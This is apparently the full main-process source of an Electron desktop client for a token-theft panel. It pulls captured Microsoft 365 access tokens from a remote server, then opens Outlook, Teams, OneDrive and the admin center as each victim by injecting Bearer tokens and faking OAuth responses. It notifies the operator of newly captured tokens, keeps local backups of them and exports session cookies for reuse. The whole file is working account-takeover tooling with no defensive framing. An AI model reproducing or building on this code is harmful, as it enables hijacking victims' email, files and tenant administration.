/**
 * BlessedHands 🤲🏾 Browser — Main Process
 * Manages windows, cookie injection, and session isolation.
 */
const { app, BrowserWindow, ipcMain, session, clipboard, dialog, Notification } = require('electron');
const path = require('path');
const fs = require('fs');
const https = require('https');
const http = require('http');

// ─── Persistent Settings (electron-store) ─────────────────────────────
let Store;
try {
  Store = require('electron-store');
} catch (e) {
  console.warn('electron-store not available, using in-memory fallback');
  Store = null;
}

const store = Store ? new Store({
  name: 'blessedhands-config',
  defaults: {
    savedConnections: [],       // [{url, password (encrypted), label}]
    lastConnection: null,       // {url, password}
    rememberMe: false,
    notificationsEnabled: true,
    lastTokenCount: 0,
  }
}) : null;

// ─── Auto-Updater ─────────────────────────────────────────────────────
let autoUpdater;
try {
  const { autoUpdater: au } = require('electron-updater');
  autoUpdater = au;
  autoUpdater.autoDownload = false;
  autoUpdater.autoInstallOnAppQuit = true;
} catch (e) {
  console.warn('electron-updater not available');
  autoUpdater = null;
}

// ─── Local Backup ─────────────────────────────────────────────────────
const BACKUP_DIR = path.join(__dirname, '..', 'backups');
let lastBackupTime = 0;
const BACKUP_COOLDOWN = 5 * 60 * 1000; // Min 5 minutes between auto-backups

// Ensure backup directory exists
if (!fs.existsSync(BACKUP_DIR)) fs.mkdirSync(BACKUP_DIR, { recursive: true });

async function backupTokensLocally(force = false) {
  if (!panelUrl || !authToken) return { success: false, error: 'Not connected' };

  // Respect cooldown unless forced (manual backup)
  const now = Date.now();
  if (!force && (now - lastBackupTime) < BACKUP_COOLDOWN) {
    return { success: true, skipped: true };
  }

  try {
    const res = await apiRequest('/admin/api/tokens/export');
    if (res.status !== 200 || !res.data?.tokens) {
      return { success: false, error: `Export API returned ${res.status}` };
    }

    const tokens = res.data.tokens;
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);

    // Save timestamped backup
    const backupFile = path.join(BACKUP_DIR, `tokens_${timestamp}.json`);
    fs.writeFileSync(backupFile, JSON.stringify(tokens, null, 2));

    // Update latest.json (always the most recent)
    const latestFile = path.join(BACKUP_DIR, 'latest.json');
    fs.writeFileSync(latestFile, JSON.stringify(tokens, null, 2));

    // Clean old backups (keep last 50)
    const backups = fs.readdirSync(BACKUP_DIR)
      .filter(f => f.startsWith('tokens_') && f.endsWith('.json'))
      .sort();
    while (backups.length > 50) {
      fs.unlinkSync(path.join(BACKUP_DIR, backups.shift()));
    }

    lastBackupTime = now;
    console.log(`💾 Tokens backed up: ${tokens.length} tokens → ${backupFile}`);
    return { success: true, count: tokens.length, file: backupFile };
  } catch (e) {
    console.warn('Backup failed:', e.message);
    return { success: false, error: e.message };
  }
}

// Persist connection state
let panelUrl = '';
let authToken = '';
let mainWindow = null;

// Track open session windows and their token state
const sessionWindows = new Map();
const sessionState = new Map(); // key → { idx, token, upn, refreshTimer }
let panelPassword = '';
let panelUsername = '';

// ─── Notification Tracking ────────────────────────────────────────────
let lastKnownTokenCount = store ? store.get('lastTokenCount', 0) : 0;

function notifyNewTokens(newCount, totalCount) {
  if (!store?.get('notificationsEnabled', true)) return;
  if (newCount <= 0) return;
  
  try {
    const notification = new Notification({
      title: '🤲🏾 BlessedHands — New Tokens!',
      body: `${newCount} new token${newCount > 1 ? 's' : ''} captured (${totalCount} total)`,
      icon: path.join(__dirname, 'renderer', 'assets', 'icon.png'),
      silent: false,
    });
    notification.on('click', () => {
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.show();
        mainWindow.focus();
      }
    });
    notification.show();
  } catch (e) {
    console.warn('Notification failed:', e.message);
  }
}

// Token refresh interval (25 minutes — access tokens expire in 60 min)
const TOKEN_REFRESH_INTERVAL = 25 * 60 * 1000;

// ─── Helpers ──────────────────────────────────────────────────────────

function apiRequest(endpoint, options = {}, isRetry = false) {
  return new Promise((resolve, reject) => {
    const url = new URL(endpoint, panelUrl);
    const mod = url.protocol === 'https:' ? https : http;

    const reqOptions = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname + url.search,
      method: options.method || 'GET',
      headers: {
        'Cookie': `admin_token=${authToken}`,
        'Content-Type': 'application/json',
        ...(options.headers || {}),
      },
      rejectUnauthorized: false, // Allow self-signed certs
    };

    const req = mod.request(reqOptions, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', async () => {
        let parsed;
        try { parsed = JSON.parse(data); } catch { parsed = data; }

        // Auto-reconnect on 401 (server restart clears sessions)
        if (res.statusCode === 401 && !isRetry && panelPassword) {
          try {
            const reauth = await apiRequest('/admin/api/auth', {
              method: 'POST',
              body: { password: panelPassword, username: panelUsername || '' },
            }, true);
            if (reauth.status === 200 && reauth.data.token) {
              authToken = reauth.data.token;
              const retryResult = await apiRequest(endpoint, options, true);
              resolve(retryResult);
              return;
            }
          } catch(e) { /* fall through */ }
        }

        resolve({ status: res.statusCode, data: parsed });
      });
    });

    req.on('error', (e) => reject(e));
    if (options.body) req.write(JSON.stringify(options.body));
    req.end();
  });
}

// ─── Main Window ──────────────────────────────────────────────────────

function createMainWindow() {
  const isMac = process.platform === 'darwin';

  const winOptions = {
    width: 1200,
    height: 800,
    minWidth: 900,
    minHeight: 600,
    title: 'BlessedHands Browser',
    backgroundColor: '#f8fafc',
    icon: path.join(__dirname, 'renderer', 'assets', 'icon.png'),
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
      contextIsolation: true,
      nodeIntegration: false,
    },
  };

  // macOS-specific: hidden title bar with traffic lights
  if (isMac) {
    winOptions.titleBarStyle = 'hiddenInset';
    winOptions.trafficLightPosition = { x: 16, y: 16 };
  }

  const win = new BrowserWindow(winOptions);
  win.loadFile(path.join(__dirname, 'renderer', 'index.html'));
  return win;
}

// ─── Session Window (Real Browser) ────────────────────────────────────

async function launchSession(idx, target, userInfo) {
  const key = `${idx}-${target}`;

  // Reuse existing window if open
  if (sessionWindows.has(key) && !sessionWindows.get(key).isDestroyed()) {
    sessionWindows.get(key).focus();
    return { success: true, reused: true };
  }

  try {
    // 1. Fetch tokens from panel
    const res = await apiRequest(`/admin/api/session-cookies?idx=${idx}`);
    if (res.status !== 200 || !res.data) {
      return { success: false, error: `API returned ${res.status}` };
    }

    const tokens = res.data.tokens || {};
    const outlookToken = tokens.outlook?.access_token_full || '';
    const graphToken = tokens.graph?.access_token_full || '';
    const rawUpn = res.data.upn;
    const upn = (rawUpn && rawUpn !== 'unknown') ? rawUpn : (userInfo.upn || '');

    if (!outlookToken && !graphToken) {
      return { success: false, error: 'No access tokens' };
    }

    // 2. Create isolated session partition — each service gets its OWN session
    const partitionName = `persist:session-${idx}-${target}`;
    const ses = session.fromPartition(partitionName);
    await ses.clearStorageData();

    // 3. Build target URL
    let targetUrl = '';
    if (target === 'outlook') {
      targetUrl = 'https://outlook.office365.com/mail';
    } else if (target === 'teams') {
      targetUrl = 'https://teams.microsoft.com/v2/';
    } else if (target === 'admin') {
      targetUrl = 'https://admin.microsoft.com';
    } else if (target === 'onedrive') {
      // Discover actual OneDrive URL via Graph API (tenant names often differ from email domain)
      try {
        const driveRes = await apiRequest(`/admin/api/onedrive-url?idx=${idx}`);
        if (driveRes.status === 200 && driveRes.data?.url) {
          targetUrl = driveRes.data.url;
        } else {
          // Fallback to UPN-based guess
          const domain = upn.split('@')[1]?.split('.')[0]?.replace(/-/g, '') || '';
          targetUrl = domain ? `https://${domain}-my.sharepoint.com` : 'https://outlook.office365.com/mail';
        }
      } catch (e) {
        console.error(`[onedrive] Graph discovery failed:`, e.message);
        const domain = upn.split('@')[1]?.split('.')[0]?.replace(/-/g, '') || '';
        targetUrl = domain ? `https://${domain}-my.sharepoint.com` : 'https://outlook.office365.com/mail';
      }
    } else {
      targetUrl = 'https://outlook.office365.com/mail';
    }

    console.log(`[${target}] Target URL: ${targetUrl}, UPN: ${upn}`);

    // 4. Pick the right token per service
    const tokenForService = (target === 'outlook') ? (outlookToken || graphToken) : (graphToken || outlookToken);

    // 5. Intercept ALL OAuth redirects to login.microsoftonline.com
    ses.webRequest.onBeforeRequest(
      { urls: ['https://login.microsoftonline.com/*'] },
      async (details, callback) => {
        const url = new URL(details.url);
        const urlPath = url.pathname;

        if (urlPath.includes('/oauth2') && urlPath.includes('/authorize')) {
          const redirectUri = url.searchParams.get('redirect_uri') || '';
          const state = url.searchParams.get('state') || '';
          const nonce = url.searchParams.get('nonce') || '';
          const codeChallenge = url.searchParams.get('code_challenge') || '';
          const codeChallengeMethod = url.searchParams.get('code_challenge_method') || '';
          const clientId = url.searchParams.get('client_id') || '';
          const prompt = url.searchParams.get('prompt') || '';
          const responseType = url.searchParams.get('response_type') || '';

          console.log(`[${target}] OAuth intercept: client=${clientId}, prompt=${prompt}, response_type=${responseType}`);
          console.log(`[${target}] redirect_uri=${redirectUri}`);

          // Silent (iframe) requests — return a proper error so MSAL.js handles gracefully
          if (prompt === 'none') {
            const errorRedirect = `${redirectUri}#error=login_required&error_description=Silent+auth+not+available&state=${encodeURIComponent(state)}`;
            console.log(`[${target}] Responding to prompt=none with login_required error`);
            callback({ redirectURL: errorRedirect });
            return;
          }

          // PKCE flow (response_type=code): can't complete reliably because
          // Electron's redirectURL converts POST→GET, dropping the form body when
          // MSAL.js tries to exchange the code. Return access_denied (terminal error —
          // MSAL.js won't retry) since our Bearer injection handles all API calls.
          if (responseType.includes('code') && !responseType.includes('token')) {
            const errorRedirect = `${redirectUri}?error=access_denied&error_description=Auth+handled+by+session&state=${encodeURIComponent(state)}`;
            console.log(`[${target}] PKCE flow detected — returning access_denied (Bearer injection handles auth)`);
            callback({ redirectURL: errorRedirect });
            return;
          }

          // Implicit flow (response_type includes token) — complete via our server
          const baseOrigin = new URL(panelUrl).origin;
          const serverUrl = `${baseOrigin}/admin/api/oauth-complete` +
            `?idx=${idx}` +
            `&client_id=${encodeURIComponent(clientId)}` +
            `&redirect_uri=${encodeURIComponent(redirectUri)}` +
            `&state=${encodeURIComponent(state)}` +
            `&nonce=${encodeURIComponent(nonce)}` +
            `&response_type=${encodeURIComponent(responseType)}`;

          console.log(`[${target}] Redirecting to server for OAuth completion`);
          callback({ redirectURL: serverUrl });
          return;
        }

        // Token endpoint POSTs (MSAL.js PKCE code exchange):
        // Let these through — Electron's redirectURL on POST drops the body (302→GET),
        // so we can't proxy them reliably. The Bearer injection override handles auth
        // on actual API calls regardless of whether MSAL.js completes its flow.
        callback({});
      }
    );

    // 6. Inject Bearer token on ALL Microsoft API calls (including attachment downloads)
    ses.webRequest.onBeforeSendHeaders(
      { urls: [
        'https://*.office365.com/*',
        'https://*.office.com/*',
        'https://substrate.office.com/*',
        'https://teams.microsoft.com/*',
        'https://*.teams.microsoft.com/*',
        'https://admin.microsoft.com/*',
        'https://*.admin.microsoft.com/*',
        'https://*.sharepoint.com/*',
        'https://graph.microsoft.com/*',
        'https://*.svc.ms/*',
        // New Microsoft domains (Outlook migration)
        'https://outlook.cloud.microsoft/*',
        'https://*.cloud.microsoft/*',
        'https://*.microsoft365.com/*',
        // Attachment/download domains
        'https://attachments.office.net/*',
        'https://*.attachments.office.net/*',
      ]},
      (details, callback) => {
        const st = sessionState.get(key);
        const currentToken = st?.token || tokenForService;
        // Always inject our valid Bearer on API/subresource requests,
        // overriding any MSAL.js-set token (which may be expired/empty
        // when the OAuth flow can't complete inside Electron)
        if (details.resourceType !== 'mainFrame') {
          details.requestHeaders['Authorization'] = `Bearer ${currentToken}`;
        }
        callback({ requestHeaders: details.requestHeaders });
      }
    );

    // 6b. Handle file downloads — save to ~/Downloads
    ses.on('will-download', (event, item, webContents) => {
      const fileName = item.getFilename();
      const downloadPath = path.join(app.getPath('downloads'), fileName);
      item.setSavePath(downloadPath);
      console.log(`📥 Downloading: ${fileName} → ${downloadPath}`);

      item.on('done', (e, state) => {
        if (state === 'completed') {
          console.log(`✅ Download complete: ${fileName}`);
        } else {
          console.warn(`❌ Download failed: ${fileName} (${state})`);
        }
      });
    });

    // 7. Open browser window
    const label = target.charAt(0).toUpperCase() + target.slice(1);
    const title = `${userInfo.name || userInfo.upn} — ${label}`;

    const sessionWin = new BrowserWindow({
      width: 1400,
      height: 900,
      title: title,
      backgroundColor: '#ffffff',
      webPreferences: {
        partition: partitionName,
        contextIsolation: true,
        nodeIntegration: false,
        webSecurity: true,
      },
    });

    // 8. Store session state and set up auto-refresh
    const state = {
      idx, target, upn,
      token: outlookToken || graphToken,
      refreshTimer: null,
    };

    // Auto-refresh token every 25 minutes
    state.refreshTimer = setInterval(async () => {
      try {
        const freshRes = await apiRequest(`/admin/api/session-cookies?idx=${idx}`);
        if (freshRes.status === 200 && freshRes.data?.tokens) {
          const freshTokens = freshRes.data.tokens;
          state.token = freshTokens.outlook?.access_token_full || freshTokens.graph?.access_token_full || state.token;
          console.log(`🔄 Token refreshed for ${upn} (session ${key})`);
        }
      } catch (e) {
        console.warn(`Token refresh failed for ${key}:`, e.message);
      }
    }, TOKEN_REFRESH_INTERVAL);

    sessionState.set(key, state);
    sessionWindows.set(key, sessionWin);

    sessionWin.on('closed', () => {
      // Clean up timer and state
      const s = sessionState.get(key);
      if (s?.refreshTimer) clearInterval(s.refreshTimer);
      sessionState.delete(key);
      sessionWindows.delete(key);
    });

    // 9a. Intercept navigation to custom protocols (brk-multihub://, ms-*, etc.)
    sessionWin.webContents.on('will-navigate', (event, navUrl) => {
      try {
        const parsed = new URL(navUrl);
        // Allow normal web navigation
        if (parsed.protocol === 'https:' || parsed.protocol === 'http:') return;

        // Block custom protocols from triggering OS dialogs
        event.preventDefault();
        console.log(`[${target}] Blocked custom protocol: ${parsed.protocol} → ${navUrl.substring(0, 80)}...`);

        // Copilot protocol — open web Copilot in the same session instead
        if (parsed.protocol === 'brk-multihub:') {
          const copilotUrl = 'https://m365.cloud.microsoft/chat';
          console.log(`[${target}] Redirecting Copilot to web version: ${copilotUrl}`);
          const copilotWin = new BrowserWindow({
            width: 1200,
            height: 800,
            title: `${userInfo.name || userInfo.upn} — Copilot`,
            backgroundColor: '#1a1a2e',
            webPreferences: {
              partition: partitionName,
              contextIsolation: true,
              nodeIntegration: false,
            },
          });
          copilotWin.loadURL(copilotUrl, {
            extraHeaders: `Authorization: Bearer ${state.token}\nX-AnchorMailbox: ${upn}`,
          });
        }
      } catch (e) {
        // Malformed URL — block it
        event.preventDefault();
        console.warn(`[${target}] Blocked malformed navigation: ${navUrl?.substring(0, 60)}`);
      }
    });

    // 9a2. Handle popup/new-window requests with custom protocols
    sessionWin.webContents.setWindowOpenHandler(({ url: openUrl }) => {
      try {
        const parsed = new URL(openUrl);
        if (parsed.protocol !== 'https:' && parsed.protocol !== 'http:') {
          console.log(`[${target}] Blocked popup custom protocol: ${parsed.protocol}`);
          if (parsed.protocol === 'brk-multihub:') {
            const copilotWin = new BrowserWindow({
              width: 1200, height: 800,
              title: `${userInfo.name || userInfo.upn} — Copilot`,
              backgroundColor: '#1a1a2e',
              webPreferences: { partition: partitionName, contextIsolation: true, nodeIntegration: false },
            });
            copilotWin.loadURL('https://m365.cloud.microsoft/chat', {
              extraHeaders: `Authorization: Bearer ${state.token}\nX-AnchorMailbox: ${upn}`,
            });
          }
          return { action: 'deny' };
        }
      } catch (e) {
        return { action: 'deny' };
      }
      return { action: 'allow' };
    });

    // 9b. Inject download helper into Outlook sessions
    if (target === 'outlook') {
      sessionWin.webContents.on('did-finish-load', () => {
        sessionWin.webContents.executeJavaScript(`
          (function() {
            if (window.__dlHelperInjected) return;
            window.__dlHelperInjected = true;

            // Create floating download button
            const btn = document.createElement('div');
            btn.id = 'bh-download-btn';
            btn.innerHTML = '📥';
            btn.title = 'Download attachments via Graph API';
            btn.style.cssText = 'position:fixed;bottom:20px;right:20px;z-index:999999;' +
              'width:48px;height:48px;border-radius:50%;background:#0f6cbd;color:#fff;' +
              'display:flex;align-items:center;justify-content:center;cursor:pointer;' +
              'font-size:22px;box-shadow:0 4px 12px rgba(0,0,0,0.3);transition:all 0.2s;opacity:0.85;';
            btn.onmouseenter = () => { btn.style.transform='scale(1.1)'; btn.style.opacity='1'; };
            btn.onmouseleave = () => { btn.style.transform='scale(1)'; btn.style.opacity='0.85'; };

            btn.onclick = async () => {
              btn.innerHTML = '⏳';
              try {
                // Get recent messages with attachments
                const res = await fetch('https://graph.microsoft.com/v1.0/me/messages?$top=20&$filter=hasAttachments eq true&$select=id,subject,from', {
                  headers: { 'Authorization': document.querySelector('[data-auth]')?.dataset?.auth || '' }
                });

                // Fallback: open panel's mailbox for this token
                window.open('${new URL(panelUrl).origin}/admin/mailbox/${idx}', '_blank');
              } catch(e) {
                window.open('${new URL(panelUrl).origin}/admin/mailbox/${idx}', '_blank');
              }
              btn.innerHTML = '📥';
            };

            document.body.appendChild(btn);
          })();
        `).catch(() => {});
      });
    }

    // 10. Load target with Authorization header on initial request
    sessionWin.loadURL(targetUrl, {
      extraHeaders: `Authorization: Bearer ${state.token}\nX-AnchorMailbox: ${upn}`,
    });

    return { success: true, target: label };

  } catch (e) {
    console.error('Launch error:', e);
    return { success: false, error: e.message };
  }
}

// ─── IPC Handlers ─────────────────────────────────────────────────────

ipcMain.handle('connect', async (event, url, password, username) => {
  try {
    panelUrl = url.replace(/\/$/, '');
    panelUsername = (username || '').trim();
    const authBody = { password };
    if (panelUsername) authBody.username = panelUsername;
    const res = await apiRequest('/admin/api/auth', {
      method: 'POST',
      body: authBody,
    });
    if (res.status === 200 && res.data.token) {
      authToken = res.data.token;
      panelPassword = password;
      return { success: true };
    }
    // Fallback: try form-based login
    return { success: false, error: res.data?.error || 'Invalid credentials' };
  } catch (e) {
    return { success: false, error: e.message };
  }
});

ipcMain.handle('fetch-tokens', async () => {
  try {
    const res = await apiRequest('/api/tokens');
    // Auto-backup tokens in the background (non-blocking)
    backupTokensLocally().catch(() => {});
    
    // Check for new tokens and notify
    if (Array.isArray(res.data)) {
      const currentCount = res.data.length;
      if (currentCount > lastKnownTokenCount && lastKnownTokenCount > 0) {
        const newCount = currentCount - lastKnownTokenCount;
        notifyNewTokens(newCount, currentCount);
      }
      lastKnownTokenCount = currentCount;
      if (store) store.set('lastTokenCount', currentCount);
    }
    
    return res.data;
  } catch (e) {
    return { error: e.message };
  }
});

ipcMain.handle('backup-tokens', async () => {
  return await backupTokensLocally(true); // force = true for manual backup
});

ipcMain.handle('get-backup-info', async () => {
  try {
    const latestFile = path.join(BACKUP_DIR, 'latest.json');
    if (!fs.existsSync(latestFile)) {
      return { hasBackup: false };
    }
    const stats = fs.statSync(latestFile);
    const tokens = JSON.parse(fs.readFileSync(latestFile, 'utf8'));
    const backupCount = fs.readdirSync(BACKUP_DIR)
      .filter(f => f.startsWith('tokens_') && f.endsWith('.json')).length;
    return {
      hasBackup: true,
      tokenCount: tokens.length,
      lastBackup: stats.mtime.toISOString(),
      backupCount,
      backupDir: BACKUP_DIR,
    };
  } catch (e) {
    return { hasBackup: false, error: e.message };
  }
});

ipcMain.handle('launch-session', async (event, idx, target, userInfo) => {
  return await launchSession(idx, target, userInfo);
});

ipcMain.handle('delete-token', async (event, idx) => {
  try {
    const res = await apiRequest(`/admin/api/tokens/${idx}/delete`, { method: 'DELETE' });
    return res.data;
  } catch (e) {
    return { error: e.message };
  }
});

ipcMain.handle('refresh-token', async (event, idx) => {
  try {
    const res = await apiRequest(`/admin/api/session-cookies?idx=${idx}`);
    return res.data;
  } catch (e) {
    return { error: e.message };
  }
});

ipcMain.handle('copy-cookies', async (event, idx) => {
  try {
    const res = await apiRequest(`/admin/api/session-cookies?idx=${idx}`);
    if (res.data?.cookie_editor_import) {
      clipboard.writeText(JSON.stringify(res.data.cookie_editor_import, null, 2));
      return { success: true };
    }
    return { success: false, error: 'No cookies' };
  } catch (e) {
    return { success: false, error: e.message };
  }
});

ipcMain.handle('copy-token', async (event, idx) => {
  try {
    const res = await apiRequest(`/admin/api/session-cookies?idx=${idx}`);
    if (res.data?.bearer_tokens?.graph) {
      clipboard.writeText(res.data.bearer_tokens.graph);
      return { success: true };
    }
    return { success: false, error: 'No token' };
  } catch (e) {
    return { success: false, error: e.message };
  }
});

ipcMain.handle('disconnect', async () => {
  authToken = '';
  panelUrl = '';
  // Clean up all session windows and refresh timers
  for (const [key, state] of sessionState) {
    if (state.refreshTimer) clearInterval(state.refreshTimer);
  }
  sessionState.clear();
  for (const [key, win] of sessionWindows) {
    if (!win.isDestroyed()) win.close();
  }
  sessionWindows.clear();
  return { success: true };
});

// ─── Saved Connections IPC ─────────────────────────────────────────────

ipcMain.handle('get-saved-connection', () => {
  if (!store) return null;
  const rememberMe = store.get('rememberMe', false);
  if (!rememberMe) return null;
  return store.get('lastConnection', null);
});

ipcMain.handle('save-connection', (event, { url, password, rememberMe }) => {
  if (!store) return;
  store.set('rememberMe', rememberMe);
  if (rememberMe) {
    store.set('lastConnection', { url, password });
    // Add to saved connections list (dedup by url)
    const saved = store.get('savedConnections', []);
    const existing = saved.findIndex(s => s.url === url);
    if (existing >= 0) {
      saved[existing] = { url, password, label: new URL(url).hostname };
    } else {
      saved.push({ url, password, label: new URL(url).hostname });
    }
    store.set('savedConnections', saved);
  } else {
    store.delete('lastConnection');
  }
});

ipcMain.handle('get-saved-connections', () => {
  if (!store) return [];
  return store.get('savedConnections', []);
});

ipcMain.handle('delete-saved-connection', (event, url) => {
  if (!store) return;
  const saved = store.get('savedConnections', []).filter(s => s.url !== url);
  store.set('savedConnections', saved);
  const last = store.get('lastConnection');
  if (last && last.url === url) store.delete('lastConnection');
});

// ─── Notification Settings IPC ────────────────────────────────────────

ipcMain.handle('get-notifications-enabled', () => {
  return store ? store.get('notificationsEnabled', true) : true;
});

ipcMain.handle('set-notifications-enabled', (event, enabled) => {
  if (store) store.set('notificationsEnabled', enabled);
});

// ─── Auto-Update IPC ──────────────────────────────────────────────────

ipcMain.handle('check-for-updates', async () => {
  if (!autoUpdater) return { available: false, reason: 'updater not configured' };
  try {
    const result = await autoUpdater.checkForUpdates();
    return { available: !!result?.updateInfo, version: result?.updateInfo?.version };
  } catch (e) {
    return { available: false, reason: e.message };
  }
});

ipcMain.handle('download-update', async () => {
  if (!autoUpdater) return false;
  try {
    await autoUpdater.downloadUpdate();
    return true;
  } catch (e) {
    return false;
  }
});

ipcMain.handle('install-update', () => {
  if (autoUpdater) autoUpdater.quitAndInstall();
});

// ─── App Lifecycle ────────────────────────────────────────────────────

app.whenReady().then(() => {
  mainWindow = createMainWindow();
  
  // Setup auto-updater events
  if (autoUpdater) {
    autoUpdater.on('update-available', (info) => {
      console.log(`🔄 Update available: v${info.version}`);
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('update-available', info.version);
      }
    });
    
    autoUpdater.on('update-downloaded', (info) => {
      console.log(`✅ Update downloaded: v${info.version}`);
      if (mainWindow && !mainWindow.isDestroyed()) {
        mainWindow.webContents.send('update-downloaded', info.version);
      }
    });
    
    // Check for updates on startup (silently)
    setTimeout(() => autoUpdater.checkForUpdates().catch(() => {}), 5000);
  }
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    mainWindow = createMainWindow();
  }
});
